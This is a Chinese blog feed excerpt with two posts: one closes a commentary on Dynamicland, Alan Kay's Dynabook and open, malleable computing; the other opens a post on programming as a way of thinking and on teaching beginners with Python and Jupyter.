&lt;p&gt;图书馆不是偶然发生的。Andrew Carnegie自掏腰包建造了2509个图书馆。Dynamicland并不便宜，也不会偶然发生。一个现代的Carnegie会降临吗？我们等着他来资助吗？或者我们是否需要自己动手，在Dynamicland网站上做一千个小额捐款？或者政府是否有可能在这个问题上买单？或者最有可能的是，Dynamicland是否会逐渐消失，作为一种从未到来的未来愿景。你希望活在怎样的未来？下次走进房间并开灯时，请考虑这些问题。&lt;/p&gt;
&lt;h1 id="_3"&gt;评注&lt;/h1&gt;
&lt;p&gt;这篇文章写得流畅动人，许多地方极具煽动力。好几处我想插入自己的思考和评注，最后都放弃了，决定通通放在文章末尾，不破坏原文的结构。&lt;/p&gt;
&lt;h3 id="_4"&gt;&lt;a href="https://zh.wikipedia.org/zh-hans/%E8%89%BE%E4%BC%A6%C2%B7%E5%87%AF"&gt;艾伦·凯&lt;/a&gt;与&lt;a href="https://zh.wikipedia.org/zh-hans/%E5%8F%B2%E8%92%82%E5%A4%AB%C2%B7%E4%B9%94%E5%B8%83%E6%96%AF"&gt;乔布斯&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;艾伦·凯（Alan Curtis Kay，1940年5月17日－）在面向对象编程和窗口式图形用户界面方面作出了先驱性贡献，他是Smalltalk的最初设计者。2003年获得图灵奖。Smalltalk吸取了Simula的class的概念，并发展出图形使用者界面（GUI），即是苹果麦金塔电脑的原型。&lt;/p&gt;
&lt;p&gt;《史蒂夫·乔布斯传》中记载，1979年，乔布斯到PARC参观。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Smalltalk的演示展现了三项惊人的成果。第一项是电脑之间如何实现联网，第二项是面向对象编程是如何工作的。但乔布斯和他的团队对这些并不感兴趣，因为他们的注意力完全被图形界面和位图显示屏幕吸引了。“仿佛蒙在我眼睛上的纱布被揭去了一样，”乔布斯后来回忆，“我看到了计算机产业的未来。”&lt;/p&gt;
&lt;p&gt;苹果公司对施乐 PARC 的这次技术盗窃，有时被形容为工业史上最严重的抢劫行为之一。乔布斯偶尔也会骄傲地承认这一说法。「归根结底，我们只是想尽量了解有史以来最棒的发明，然后将它运用到我们正在做的事情中。」 他有一次说，「毕加索不是说过吗，‘好的艺术家抄袭创意，伟大的艺术家窃取灵感。’ 在窃取伟大的灵感这方面，我们一直都是厚颜无耻的。」&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;乔布斯在2007年著名的iphone发布会现场PPT上引用了艾伦·凯说的一句话:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;People who are really serious about software should make their own hardware.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src="http://wwj-fig-bed.just4fun.site/dynamiclabd_aec394b6.png" width=600 /&gt;&lt;/p&gt;
&lt;p&gt;这句话一直是苹果的核心战略。&lt;/p&gt;
&lt;h3 id="dynabook"&gt;Dynabook&lt;/h3&gt;
&lt;p&gt;艾伦·凯发明Smalltalk编程语言的目的之一是为了发展&lt;a href="https://zh.wikipedia.org/zh-hans/Dynabook"&gt;Dynabook&lt;/a&gt;。Dynabook的主要使用者是小孩，它能帮助小孩更好地去探索和学习。&lt;/p&gt;
&lt;p&gt;艾伦·凯在1972年发表的一篇论文:&lt;a href="https://mprove.de/diplom/gui/kay72.html"&gt;一款适合各年龄儿童的个人电脑&lt;/a&gt;(A Personal Computer for Children of All Ages)，这篇论文详述了Dynabook的构想。&lt;/p&gt;
&lt;p&gt;艾伦·凯在谈论Dynabook的论文里，所表现出的睿智、远见和对教育的不满，在今天看来，依然字字珠玑。这么多年过去了，人们创建了很多新东西，偶然读起艾伦·凯的那篇文章，我很难相信这个领域是在进步。&lt;/p&gt;
&lt;h3 id="_5"&gt;可组合性和互操作性&lt;/h3&gt;
&lt;p&gt;也许你不大理解什么是可组合性和互操作性。但你应该体验过什么是&lt;code&gt;不可组合性&lt;/code&gt;和&lt;code&gt;不互操作性&lt;/code&gt;，如果你曾经用过apple的产品的话。最典型的代表莫过ipad。&lt;/p&gt;
&lt;p&gt;《史蒂夫·乔布斯传》中有两段读来有趣：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;数字世界最根本的分歧是开放与封闭的对立，而对一体化系统的本能热爱让乔布斯坚定地站在了封闭一边。从家酿计算机俱乐部传承下来的黑客精神倾向于开放的方式，&lt;/p&gt;
&lt;p&gt;大多数的黑客和业余爱好者都喜欢定制和改装自己的电脑，往上面插上各种部件。对乔布斯来说，这会威胁到无缝的用户体验。骨子里还是一名黑客的沃兹尼亚克并不同意。他想要AppleII带上8个扩展槽，可以让用户随心所欲地插上小型电路板或者外接设备。乔布斯坚持只能有两个扩展槽，一个给打印机，另一个给调制解调器。“通常我是个很好说话的人，但这一次我告诉他：你要是只想要两个扩展槽的话，就自己去做一台吧。’”沃兹回忆道，“我知道，像我这样的人最终总是会想出点儿东西来加到电脑上的。”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;黑客热爱开放系统，以及由此带来的可组合性和互操作性，&lt;a href="https://book.douban.com/subject/6860890/"&gt;《黑客: 计算机革命的英雄》&lt;/a&gt;写到这个人群的信仰:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;对计算机的访问（以及任何可能帮助你认识我们这个世界的事物）应该是不受限制的、完全的。任何人都有动手尝试的权利！ 黑客们相信，通过将东西拆开，了解它们的工作原理，并根据这种理解创造新奇的甚至更有趣的东西，可以学习到关于系统（关于世界）的重要知识。他们痛恨一切试图阻止他们这么做的人、物理障碍或者法律。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;相比于mac，unix/linux被视为拥有强大的可组合性/互操作性，前提是你理解了这个系统的哲学。关于unix/linux的可组合性，&lt;a href="https://book.douban.com/subject/1467587/"&gt;《unix编程艺术》&lt;/a&gt;一书有许多精彩论述，大家可以翻阅。尽管unix/linux社区秉承&lt;a href="https://zh.wikipedia.org/wiki/KISS%E5%8E%9F%E5%88%99"&gt;KISS&lt;/a&gt;之类的好习惯，但要理解它们依然不是普通用户能轻易做到的。相比于windows和mac，unix/linux的可组合性和互操作性要好很多，但也并不理想。艾伦·凯在squeak社区中对unix颇有微词，unix的文本化和管道带来了可组合性，但却十分原始和低级。unix不是面向对象的。&lt;/p&gt;
&lt;h3 id="_6"&gt;计算机的可塑性&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;最糟糕的是，我们已经忘记了计算机最突出的部分：它们的可塑性。我们已经默许，将创造虚拟世界的权利，让渡给那些 能够花费巨资去雇佣足够多的软件工程师的人们。那些击中我们眼睛的光子来自完全可替代像素，但对于我们大多数人来说，这些像素似乎都是用石头雕刻般不可修改。&lt;/p&gt;
&lt;p&gt;智能手机应用程序就像从前的厨房用具一样，是一种经过精心设计的单一用途工具，只有极少的可定制性和互操作性。它们有数百万行怪异的代码，只有一大批程序员才能驯服。 一旦人们付了钱，孩子们就会得到神奇的长方形，这些长方形像真正的魔法一样难以理解。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;今天的这个局面，乔布斯应该要负主要责任。这篇文章中的火药味似乎也是针对乔布斯。文中反复提到的魔法盒子，我想作者指的是ipad/iphone。《史蒂夫·乔布斯传》中，乔布斯/苹果推动了个人电脑产业以及后来的智能手机产业，windows和安卓只是它的模仿者。最初的人机交互界面(GUI)，乔布斯抄自艾伦·凯，当然也加入了很多创新。今天的局面是乔布斯热望的，却不是艾伦·凯能满意的。当然也不会是任何黑客能满意的，所以黑客们今天依然在使用&lt;a href="https://zh.wikipedia.org/zh-hans/%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%95%8C%E9%9D%A2"&gt;CLI&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;由于黑客们迫切需要可塑的电脑，所以苹果的联合创始人沃兹尼亚克，会怒气冲冲地反对乔布斯对扩展槽的限制。也是对可塑性的热爱，所以沃兹尼亚克在今天会站出来支持&lt;a href="https://pi-top.com/education/"&gt;pi-top&lt;/a&gt;这款基于树莓派，允许你随意diy的电脑。&lt;/p&gt;
&lt;p&gt;开放源代码是增强可塑性的有效方式。但要有效提高可塑性有更多需要做的事情。&lt;/p&gt;
&lt;p&gt;关于这点我赞同Dynamicland在&lt;a href="https://dynamicland.org/faq/"&gt;faq&lt;/a&gt;中写的:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Dynamicland与开源运动分享了许多核心价值观，并在某些方面超越了它们。&lt;br /&gt;
Dynamicland的主要设计原则是所有正在运行的代码必须是可见的，印刷在物理世界的纸上。因此，无论何时程序运行，其源代码都可供任何人查看和修改。同样，操作系统本身也是作为代码页实现的，社区成员可以不断修改和改进它。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;也就是说，Dynamicland中的物理页面不在git存储库中。社区在空间上组织代码 -- 将其放在桌子和墙壁上，将其存储在文件夹，活页夹和书架中。&lt;/p&gt;
&lt;h3 id="_7"&gt;投影仪与彩色圆点&lt;/h3&gt;
&lt;p&gt;要理解Dynamicland是不易的，尽管这篇文章写得有趣又吸引人，但读者们读完这篇文章可能依然有许多疑惑，其中典型的困惑如dynamicland是围绕投影仪构建的吗？&lt;/p&gt;
&lt;p&gt;Dynamicland在天花板上使用商业相机和投影仪来跟踪物理对象的位置并投影到它们上面。彩色圆点便是为了更方便机器视觉识别。Dynamicland不是关于投影仪的，而是关于可以在公共环境中编程的物理对象。Dynamicland只是从相机和投影仪开始，但Realtalk与所使用的传感器和执行器无关。Dynamicland正在积极尝试其他计算机参与物理世界的方式，例如通过机器人技术。&lt;/p&gt;
&lt;h3 id="neverland"&gt;"永无乡"(neverland)&lt;/h3&gt;
&lt;p&gt;"永无乡"是&lt;a href="https://codelab.club/"&gt;codelab.club&lt;/a&gt;活动空间的名字。&lt;/p&gt;
&lt;p&gt;"永无乡"(neverland)名字来自《小飞侠彼得·潘》,是故事中的一座海岛。在永无乡里，人们永远长不大。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;后来，他领着我飞到了永无乡，那儿还有仙子，还有海盗，还有印第安人，还有人鱼的礁湖；还有地下的家，还有那间小屋子。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;a href="https://codelab.club/"&gt;codelab.club&lt;/a&gt;是一个非营利组织(这点和Dynamicland一样)，codelab.club的第一笔捐赠来自罗云先生。codelab在广州有一间办公室，我们近期正在装修，投入使用之后，它将对外开放，你可以在任何时间来找我们玩，我们在其中办公，在其中编程，在其中玩乐，在其中做一些有趣的探索和创作。&lt;/p&gt;
&lt;p&gt;我们近期计划在neverland使用&lt;a href="https://codelab-adapter-docs.codelab.club/"&gt;codelab-adapter&lt;/a&gt;做很多有趣的事，&lt;a href="https://codelab-adapter-docs.codelab.club/"&gt;codelab-adapter&lt;/a&gt;受艾伦·凯的smalltalk影响很深，而Dynamicland将影响&lt;a href="https://codelab-adapter-docs.codelab.club/"&gt;codelab-adapter&lt;/a&gt;未来的设计。Dynamicland是我们所期待的关于计算的未来图景，我们计划在neverland中实现它。期待你与我们一起来塑造它。&lt;/p&gt;
&lt;p&gt;just for fun， just for you.&lt;/p&gt;
&lt;p&gt;此外，我们明年三月份，准备参加在UCSD 举办的Open edX年会，年会结束后，我们计划往奥克兰拜访Dynamicland和艾伦·凯，Dynamicland在2018年开始接受访问，如果你也计划同往，欢迎结伴通行。&lt;/p&gt;
&lt;p&gt;如果Dynamicland让你热血沸腾，codelab也许是你目前在国内能找到的最理想的地方去实现它：）&lt;/p&gt;
&lt;p&gt;期待你的邮件: wuwenjie718@gmail.com&lt;/p&gt;
&lt;h1 id="_8"&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Meta-research"&gt;元研究&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://phenomenalworld.org/metaresearch/the-next-big-thing-is-a-room"&gt;The "Next Big Thing" is a Room&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://harc.ycr.org/"&gt;HARC (Human Advancement Research Community)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://dynamicland.org/"&gt;dynamicland&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://dynamicland.org/faq/"&gt;faq&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/dynamicland/"&gt;github.com/dynamicland&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://news.ycombinator.com/item?id=11939851"&gt;Alan Kay has agreed to do an AMA today&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://rsnous.com/posts/notes-from-dynamicland-geokit/"&gt;Notes from Dynamicland: Geokit&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://paperprograms.org/"&gt;paperprograms&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/janpaul123/paperprograms/issues/30"&gt;paperprograms Realtalk&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/janpaul123/paperprograms"&gt;github/paperprograms&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zhuanlan.zhihu.com/p/44658507"&gt;一款适合各年龄儿童的个人电脑&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://cognitivemedium.com/tat/assets/Kay_What_is_a_Dynabook.pdf"&gt;What is a Dynabook&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zhuanlan.zhihu.com/p/45147384"&gt;什么是Dynabook&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/KISS%E5%8E%9F%E5%88%99"&gt;KISS&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.cs.virginia.edu/~evans/cs655/readings/smalltalk.html"&gt;Design Principles Behind Smalltalk&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://sites.google.com/site/liuxinyu95/squeak.dev.chinese.books.guzdial.chapter1"&gt;Objects、Smalltalk、Dynabooks和Squeak：Objects的由来&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/zh-hans/%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%95%8C%E9*%9D%A2"&gt;CLI&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://codelab-adapter-docs.codelab.club/"&gt;codelab-adapter&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://pi-top.com/education/"&gt;pi-top&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://codelab.club/"&gt;codelab.club&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 05 Nov 2018 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2018-11-05:the-next-big-thing-is-a-room.html</guid><category>codelab</category></item><item><title>编程作为一种思考方式</title><link>/programming-as-a-way-of-thinking.html</link><description>&lt;p&gt;&lt;img alt="" src="http://wwj-fig-bed.just4fun.site/tools_74a0271d.png" /&gt;&lt;/p&gt;
&lt;h1 id="_1"&gt;前言&lt;/h1&gt;
&lt;p&gt;近期在阅读和翻译一些国外文章和项目，关于编程入门和学习，这些作者的兴趣不只在技术，他们中的不少人关心教育和认知科学。&lt;/p&gt;
&lt;p&gt;国内编程教育目前十分火热，但对于什么是好的编程入门教育，什么是好的编程入门语言，大家莫衷一是，铺天盖地的广告/口水文虽不少，但几乎没看到什么高质量的讨论文章，甚至没什么人真在认真思考这件事。&lt;/p&gt;
&lt;p&gt;去年翻译了&lt;a href="https://github.com/quobit/awesome-python-in-education"&gt;awesome-python-in-education&lt;/a&gt;，这是由西班牙的一位计算机科学老师&lt;a href="https://github.com/quobit"&gt;quobit&lt;/a&gt;发起的一个项目，旨在收集Python教育方面的资源列表。&lt;/p&gt;
&lt;p&gt;我的翻译版本为: &lt;a href="https://github.com/wwj718/awesome-python-in-education-zh"&gt;Python教育资源大全中文版&lt;/a&gt;.除了翻译之外，对于列表中不熟悉的项目/内容，我都亲手试用或阅读了一遍，并给出评价和使用体验。&lt;/p&gt;
&lt;p&gt;在这份列表里，我很喜欢&lt;a href="http://pgbovine.net/python-teaching.htm"&gt;Philip Guo&lt;/a&gt;教授写的&lt;a href="http://pgbovine.net/python-teaching.htm"&gt;Why Python is a great language for teaching beginners in introductory programming classes&lt;/a&gt;一文。他也是&lt;a href="https://github.com/pgbovine/OnlinePythonTutor"&gt;OnlinePythonTutor&lt;/a&gt;项目的发起者。&lt;/p&gt;
&lt;p&gt;在征得&lt;a href="http://pgbovine.net/python-teaching.htm"&gt;Philip Guo&lt;/a&gt;教授的同意之后，我试着把这篇文章翻译到我博客上(还在进行中)。我同@qumin说了我的想法，@qumin给了一些建议。其中提到说:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;可不可以在单纯翻译某篇文章的基础上更进一步，以某个问题或主题为导向，在阅读大量好的材料之后进行整合和创作，就像刘未鹏博客里的很多文章一样，往往根据一条主线旁征博引，博采众长（给出很多reference），这样翻译工作也就成了整个创作过程的一部分，文章容量更大，读者一站式地对该主题可以有深刻而全面的了解，可能会更有说服力，有点像文献综述（literature review）的感觉。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我也是&lt;a href="http://mindhacks.cn/"&gt;刘未鹏&lt;/a&gt;的读者。刘未鹏的写作让我想起乔纳森·卡勒《文学理论入门》中说的:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;从歌德、麦考利、卡莱尔和爱默生的时代开始出现了一种新型的著作，这些著作既不是评价文学作品的相对短长，也不是思想史，不是伦理哲学，也不是关于社会的预言，而是所有这些融为一体，形成一种新的体裁... 是一系列没有界限的、评说天下万物的著作，从哲学殿堂里学术性最强的问题到人们以不断变化的方法评说和思考的身体问题，无所不容。“理论”的种类包括人类学、艺术史、电影研究、性别研究、语言学、哲学、政治理论、心理分析、科学研究、社会和思想史，以及社会学等各方面的著作。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;2013年大三的时候，因为读了&lt;a href="http://mindhacks.cn/"&gt;刘未鹏&lt;/a&gt;的&lt;a href="http://mindhacks.cn/2009/02/15/why-you-should-start-blogging-now/"&gt;为什么你应该（从现在开始就）写博客&lt;/a&gt;，开始了自己的博客之旅，至今，断断续续写了&lt;a href="https://blog.just4fun.site/index44.html"&gt;440篇博文&lt;/a&gt;,记录自己的日常、思考、技术探索和读书笔记。&lt;/p&gt;
&lt;p&gt;在本文中，我试着按照@qumin的建议:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在阅读大量好的材料之后进行整合和创作...有点像文献综述（literature review）的感觉.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;但我未必会始终:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;根据一条主线旁征博引.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;而有可能根据文中提到有趣观点或材料，引出思考，当然它们应该都与文章主题相关.&lt;/p&gt;
&lt;p&gt;本文是第一次尝试。&lt;/p&gt;
&lt;h1 id="_2"&gt;编程作为一种思考方式&lt;/h1&gt;
&lt;p&gt;Allen Downey 去年(2017)写了一篇精彩的文章: &lt;a href="https://blogs.scientificamerican.com/guest-blog/programming-as-a-way-of-thinking/"&gt;Programming as a Way of Thinking&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;摘要中写道:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The power of modern programming languages is that they are expressive, readable, concise, precise, and executable.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;现代编程语言的强大之处在于它们具有表现力、可读性、简洁性、精确性和可执行性&lt;/code&gt;正是《编程作为一种思考方式》一文的核心论点。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;编程过去常常是关于转换的：用自然语言表达思想，同时使用一些数学符号，然后编写流程图和伪代码，最后编写程序。转换是必要的，因为每种语言提供了不同的潜在能力。自然语言具有表现力和可读性，伪代码更精确，数学符号简洁，代码可执行。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在过去，"编程"是一种很割裂的活动。当时的人们以及今天写FORTRAN和C之类第一代语言的人，恐怕并不这么看。如果没用过高级语言(像文中作者提到的Python)，你可能觉得编程就该是这样的，在几种“语言”中转化。由于你一般用自然语言表达思想，你可能把"编程"视为末技，在你眼中，编程不过是“写代码”，思考都在编程之前进行了，编程不过是把前边已经想清楚的事(很可能已经有伪代码了) &lt;strong&gt;转换&lt;/strong&gt;为可执行的代码罢了。 &lt;/p&gt;
&lt;p&gt;这种观点，在计算机诞生之初，冯诺伊曼就表述过。《逻辑的引擎》一书里提到:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;冯·诺依曼把计算机程序设计看作一种活动，把这种看法与图灵的看法作一番比较是很有趣的。冯·诺依曼称之为“编码”，并且明确指出它是一种办事员的工作，基本不需要理智参与。有一件轶事颇能发人深省，高等研究院让学生用手摇计算机把人类易读的指令翻译成机器语言，有一个极富才华的年轻人提议写一个汇编器来自动完成这种转换。据说冯·诺依曼曾经气愤地说，让一个有用的科学工具去做一项办事员的工作简直是浪费时间。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;图灵的观点则要现代很多:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;计算机程序设计过程应当是非常吸引人的，它不应被沦落为苦差事，因为任何非常机械的过程都可以交由机器本身去处理。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;如果你使用过现代编程语言(如Python)，你可能会觉得编程是一种综合的体验:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;它们具有表达性、可读性、简洁性、精确性和可执行性。这意味着我们可以排除中介语言，使用一种语言来探索、学习、教学和思考。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;于是编程成为一种体验一致的活动。你的探索、学习、教学和思考都能在一门语言中进行，不再需要在自然语言、流程图、数学符号、编程语言中来回切换。&lt;/p&gt;
&lt;h3 id="_3"&gt;一个例子&lt;/h3&gt;
&lt;p&gt;我们跟着作者来看一个例子： &lt;a href="https://zh.wikipedia.org/wiki/%E5%B9%BF%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2"&gt;广度优先搜索(BFS)算法&lt;/a&gt;（该算法常出现在各类教科书里）的伪代码表示和Python语言表示。&lt;/p&gt;
&lt;p&gt;维基百科解释说:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;广度优先搜索是从根节点开始，沿着树的宽度遍历树的节点。如果所有节点均被访问，则算法中止。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;先看看伪代码表示。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;伪代码（英语：pseudocode），是高层次描述算法的一种方法。它不是一种现实存在的编程语言；它可能综合使用多种编程语言的语法、保留字，甚至会用到自然语言。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src="http://wwj-fig-bed.just4fun.site/bfs_96bbc84f.png" width=700 /&gt;&lt;/p&gt;
&lt;p&gt;上述伪代码用了不少逻辑学常用的符号，如果你没接触过伪代码，它们可能看起来怪吓人，有点像数学证明。&lt;/p&gt;
&lt;p&gt;接着让我们看看它的Python表示:&lt;/p&gt;
&lt;p&gt;&lt;img src="http://wwj-fig-bed.just4fun.site/bfs_dde91b8b.png" width=700 /&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;它比伪代码短几行，而且因为它使用的单词比符号多，所以我认为它更易于阅读。此外，与伪代码不同，我们可以运行它、显示结果并调试它。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;人们常认为伪代码的可读性优于编程语言，但这儿作者有个很有趣的论点:&lt;strong&gt;Python使用的单词比符号多，所以我认为它更易于阅读&lt;/strong&gt;。人们为褒奖Python的可读性，有时会说&lt;code&gt;Python是可以运行的伪代码&lt;/code&gt;，但在Allen Downey看来这句话其实是在褒奖伪代码的易读性。&lt;/p&gt;
&lt;p&gt;除了有极佳的可读性，更重要的是:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;可以运行它、显示结果并调试它.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;如果你使用&lt;a href="http://jupyter.org"&gt;Jupyter&lt;/a&gt;的话，上述的这些过程会更加统一。这是一种绝佳的进行教育与交流的方式。将你在Jupyter中的探索过程用ipynb分发出去，它就是绝佳的教学材料、可复现的论文。其中记录了你思考、探索、编程、调试的全景。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;编程的重要目的当然就是为了能跑通代码，但它还有更多的意义。那就是通过执行代码的能力使编程成为思考和探索的工具。当我们以程序的形式表达想法时，我们使它们成为可测试验证的;当我们调试程序时，我们也在调试我们的大脑。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;好的编程语言应该能够容易表述你大脑中思想的图景。由于它是可执行的，于是你能即时验证想法，你的想法容易被证实或&lt;a href="https://zh.wikipedia.org/zh-hans/%E5%8F%AF%E8%AF%81%E4%BC%AA%E6%80%A7"&gt;证伪&lt;/a&gt;。实际上，你在执行和调试代码的时候，也是在调试大脑里的想法，想想&lt;a href="https://zh.wikipedia.org/zh-hans/%E8%AF%BB%E5%8F%96%EF%B9%A3%E6%B1%82%E5%80%BC%EF%B9%A3%E8%BE%93%E5%87%BA%E5%BE%AA%E7%8E%AF"&gt;REPL&lt;/a&gt;！在这个意义上，计算机语言会根本地改变我们思考的方式。&lt;/p&gt;
&lt;p&gt;语言会影响你的思考。如果你是个笨蛋，无论你使用什么语言大约都无法说出什么妙论，但如果你是个普通人，高级语言能让你的思考更轻松些，而不必来回切换，尤其当你是新手时，这会更少地消耗你的耐心，更不容易让你在一开始就放弃。对于初学者而言，不放弃比多学一些知识重要得多。&lt;/p&gt;
&lt;p&gt;关于语言和思考的关系，&lt;a href="https://zh.wikipedia.org/zh-hans/%E8%B7%AF%E5%BE%B7%E7%BB%B4%E5%B8%8C%C2%B7%E7%BB%B4%E7%89%B9%E6%A0%B9%E6%96%AF%E5%9D%A6"&gt;维特根斯坦&lt;/a&gt;做了最为精辟的阐述，《逻辑哲学论》和《哲学研究》都极为精彩。当然这些梯子你最好用完就丢:)&lt;/p&gt;
&lt;p&gt;如果我和维特根斯坦一样激进，我可能会说，语言会极大影响甚至决定你的思考方式和深度。维特根斯坦说, 当我在用笔写作时，我的脑子并不知道发生了什么。&lt;/p&gt;
&lt;p&gt;Allen Downey接下来论述Python之类的高级语言适合学习和教学。他以亲身例子来说明。Allen Downey写了很多书，而且他把很多书都放在&lt;a href="https://nbviewer.jupyter.org/github/AllenDowney/"&gt;nbviewer AllenDowney&lt;/a&gt;,他最近写了一本关于数字信号处理(DSP)的书(&lt;a href="Think DSP"&gt;Think DSP&lt;/a&gt;)。使用Python编写了一个简单的库(&lt;a href="https://github.com/AllenDowney/ThinkDSP/blob/master/code/thinkdsp.py"&gt;thinkdsp&lt;/a&gt;),且使用Jupyter写代码教程，之后分发给学生。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;我同时编写代码来检验我自己的理解，同时把这些理解都解释给我的学生们听。学生们也可以来运行代码来去开发一个心智模型，进行修改以测试他们自己的预测，为他们的项目扩展我的代码。&lt;br /&gt;
大多数教科书和课堂都靠学生们主要使用纸和铅笔来工作并使用数学这门工具来传授信号处理。使用这种方法，唯一的选项是“自底而上”，从学习复数算术这个并不是最热点的专题开始，并花费数周的时间和许多页纸的篇幅才能达得相关的应用程序这个阶段。&lt;br /&gt;
用一种计算方法，我们可以“自顶向下”，从实现最重要算法的库开始，比如快速傅里叶变换。学生可以先使用这些算法，然后学习它们是如何工作的。他们可以看到最重要的想法，比如光谱分解，而不会被细节所蒙蔽。他们可以在真正的应用程序上工作，在第一天，提供动机去更深入。他们可以有更多的乐趣。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这段极为精彩。大多的教程和教师关心的始终是如何灌输知识，如何教会学生语法、算法、当然还有解题法，他们完全不考虑学习者的热情、兴趣和困惑，就这点来说，我认为教师这个职业大部分可以轻易被AI取代。&lt;/p&gt;
&lt;p&gt;我很赞同Allen Downey直接提供可运行的算法库的做法，学生一开始能把它运行起来，他就不大可能在遭遇自底而上的一堆细节时放弃，而且也可能在探索和修修改改中产生兴趣。&lt;a href="http://pgbovine.net/python-teaching.htm"&gt;Philip Guo&lt;/a&gt;在&lt;a href="http://pgbovine.net/python-teaching.htm"&gt;Why Python is a great language for teaching beginners in introductory programming classes&lt;/a&gt;开头里说：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;我坚信大多数入门学习者根本不关心计算机科学或编程语言理论，而只是想让计算机简单运行一下他们的代码，而不必大费周章写一堆样板代码。需要编写的代码越少，可能遇到的bug和错误就越少; 而遇到的bug和错误越少，他们就越不容易在入门之初因为沮丧而放弃编程。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Allen Downey的这段话特别打动我:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;他们可以在真正的应用程序上工作，在第一天，提供动机去更深入。他们可以有更多的乐趣。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;当你在脑子里把读者想象为一群有情感、追寻兴趣、遇到挫折就可能放弃的人类的时候，写出的必然是Allen Downey写出的这类教材。这类教材我想到的还有&lt;a href="https://en.wikipedia.org/wiki/Head_First_(book_series)"&gt;head first系列&lt;/a&gt;。&lt;/p&gt;
